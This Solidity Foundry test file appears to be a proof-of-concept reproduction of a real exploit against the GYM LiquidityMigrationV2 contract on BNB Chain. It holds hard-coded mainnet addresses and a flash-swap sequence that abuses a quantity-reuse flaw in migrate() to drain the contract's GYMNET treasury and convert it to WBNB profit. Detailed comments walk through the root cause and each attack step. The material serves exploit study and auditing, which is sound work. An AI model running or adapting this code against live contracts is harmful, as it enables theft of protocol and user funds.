// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    ILiquidityMigrationV2 liquidityMigrationV2 =
        ILiquidityMigrationV2(payable(0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4));
    IPancakePair wbnbBusdPair = IPancakePair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
    IPancakePair wbnbGymPair = IPancakePair(0x8dC058bA568f7D992c60DE3427e7d6FC014491dB);
    IPancakePair wbnbGymnetPair = IPancakePair(0x627F27705c8C283194ee9A85709f7BD9E38A1663);
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 gym = IERC20(0xE98D920370d87617eb11476B41BF4BE4C556F3f8);
    IERC20 gymnet = IERC20(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);

    // VULNERABILITY: GYMNET treasury drain via qty-reuse in LiquidityMigrationV2.migrate (no rate/ownership validation)
    // Root cause: migrate() (called by anyone) blindly re-uses the qty of v1 GYM tokens received
    //   from burning caller-supplied v1 LP as the amountTokenDesired when calling addLiquidityETH
    //   on v2 GYMNET, pulling from the contract's own pre-approved treasury balance of GYMNET and
    //   sending the resulting WBNB/GYMNET LP to the arbitrary _msgSender(). See:
    //   - sources/LiquidityMigrationV2_1BEfe6/contracts_LpMigration.sol:41 (ctor): IERC20(v2Address).approve(router, type(uint256).max);
    //   - sources/.../LpMigration.sol:49: function migrate(uint256 _lpTokens) public nonReentrant
    //   - L52: IERC20(lpAddress).transferFrom(_msgSender(), this, _lpTokens)
    //   - L53-59: (amountTokenRecived, amountEthRecived) = Router.removeLiquidityETH(v1Address, _lpTokens, 0,0, this, ts)
    //   - L63-69: Router.addLiquidityETH{value:amountEthRecived}(v2Address, amountTokenRecived /*<-- v1 qty*/, 0,0, _msgSender(), ts)
    //   - also L80-82 withdrawTokens lets owner sweep leftover v1 tokens later.
    // Why it works: (1) no ACL on migrate (2) amountTokenRecived from *any* LP (even flash-minted tiny) dictates how much GYMNET treasury to spend (3) no price check, no caller-supplied v2 value, no min-out on GYMNET side, LP titled to caller not protocol (4) Pancake LP add/remove + Gym taxes handled via *SupportingFeeOnTransferTokens (5) migrator holds large GYMNET balance from prior setup.
    // Impact: Attacker drains migrator's entire GYMNET balance (protocol funds). In this PoC, flash-swap enables zero-capital attack yielding ~1373 WBNB net after repay. Leftover v1 GYM + dust stays in migrator (owner-recoverable). Breaks the intended v1->v2 LP migration trust.
    // Code refs (this file): pancakeCall L79- (flash path), L88-94 (mint old LP), L101 (trigger migrate), L104-107 (harvest new LP), L108-117 (exit swaps), L118 (repay).
    // EXPLOIT STEPS:
    // 1. In testExploit: pancake flash-swap 2400e18 WBNB from wbnbBusdPair (0x58F8..) -> callback pancakeCall with amount0.
    // 2. Swap 600e18 WBNB -> GYM(v1 0xE98D..) using swapExactTokensForTokensSupportingFeeOnTransferTokens (L80-84).
    // 3. addLiquidity(WBNB, GYM, wbnb.balanceOf(this), gymnet.balanceOf(liquidityMigrationV2) [huge], 0,0, to=this) (L88-94) mints small WBNB/GYMv1 LP (B limited by our GYM; huge arg just to not constrain).
    // 4. liquidityMigrationV2.migrate( wbnbGymPair.balanceOf(this) ) (L101) -- does transferFrom of the LP to migrator.
    // 5. Inside migrate (external): remove old LP (v1 GYM qty + WBNB sent to migrator), addLiquidityETH(v2=GYMNET, desired=amountTokenRecived=that qty, value=eth, to=attacker) -- router pulls matching qty GYMNET from migrator's treasury (pre-approved) + pairs, sends new LP tokens to attacker.
    // 6. removeLiquidityETHSupportingFeeOnTransferTokens(GYMNET, wbnbGymnetPair.balanceOf(this), ...) (L104) -> receives the drained GYMNET + ETH to this.
    // 7. wbnb.deposit{value: this.balance}(); swap residual GYM(v1) and GYMNET to WBNB via two SupportingFeeOnTransfer swaps (L108-117).
    // 8. wbnb.transfer(msg.sender /*pair*/, (amount0/9975*10000)+10000); wbnb.transfer(tx.origin, remaining) to repay flash + profit (L118-119).
    // 9. test ends with attacker's WBNB balance increased by profit (logged before/after).

    constructor() {
        cheat.createSelectFork("http://127.0.0.1:8546", 16_798_806); //fork bsc at block 16798806

        wbnb.approve(address(pancakeRouter), type(uint256).max);
        gym.approve(address(pancakeRouter), type(uint256).max);
        gymnet.approve(address(pancakeRouter), type(uint256).max);
        wbnbGymPair.approve(address(pancakeRouter), type(uint256).max);
        wbnbGymPair.approve(address(liquidityMigrationV2), type(uint256).max);
        wbnbGymnetPair.approve(address(pancakeRouter), type(uint256).max);
    }

    function testExploit() public {
        payable(address(0)).transfer(address(this).balance);
        emit log_named_uint("Before exploit, USDC  balance of attacker:", wbnb.balanceOf(msg.sender));
        wbnbBusdPair.swap(2400e18, 0, address(this), new bytes(1));
        emit log_named_uint("After exploit, USDC  balance of attacker:", wbnb.balanceOf(msg.sender));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(gym);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            600e18, 0, path, address(this), type(uint32).max
        );
        // VULNERABILITY (prep): Mint a small qty of OLD (WBNB/GYM-v1) LP using flash WBNB + swapped GYM.
        // The amountBDesired=gymnet.balanceOf(migrator) is larger than our GYM so effectively uses
        // our full GYM balance to create proportional old LP. We will "sacrifice" this LP.
        // NOTE: this LP has negligible value to protocol; it only serves as qty carrier for the qty-reuse bug.
        pancakeRouter.addLiquidity(
            address(wbnb),
            address(gym),
            wbnb.balanceOf(address(this)),
            gymnet.balanceOf(address(liquidityMigrationV2)),
            0,
            0,
            address(this),
            type(uint32).max
        );
        // VULNERABILITY TRIGGER: Call migrate with the freshly minted old LP balance.
        // This transfers LP to migrator, which removes it (getting GYM-v1 qty + ETH), then
        // addLiquidityETH(GYMNET, amount=receivedGYMv1Qty, value=ETH, to=attacker) which
        // because of the unlimited v2 approval + qty reuse, pulls GYMNET from *protocol treasury*
        // and gives the minted new LP to us.
        // VULNERABILITY: [qty-reuse in migrate] -- the _lpTokens we pass here controls how much
        // GYMNET the contract will spend on our behalf via its Router approval, with no relation
        // enforced to the actual economic value of the LP provided or any v2 contribution from caller.
        liquidityMigrationV2.migrate(wbnbGymPair.balanceOf(address(this)));
        // VULNERABILITY (harvest): Remove the new GYMNET/WBNB LP we just received from migrate.
        // This yields the drained GYMNET + ETH which we later convert to profit WBNB.
        // At this point attacker has extracted GYMNET qty == (v1 GYM received by migrator from the bogus LP)
        // directly from protocol balance, without ever holding or providing equivalent GYMNET.
        pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(gymnet), wbnbGymnetPair.balanceOf(address(this)), 0, 0, address(this), type(uint32).max
        );
        wbnb.deposit{value: address(this).balance}();
        path[0] = address(gym);
        path[1] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            gym.balanceOf(address(this)), 0, path, address(this), type(uint32).max
        );
        path[0] = address(gymnet);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            gymnet.balanceOf(address(this)), 0, path, address(this), type(uint32).max
        );
        wbnb.transfer(msg.sender, ((amount0 / 9975) * 10_000) + 10_000);
        wbnb.transfer(tx.origin, wbnb.balanceOf(address(this)));
    }

    receive() external payable {}
}
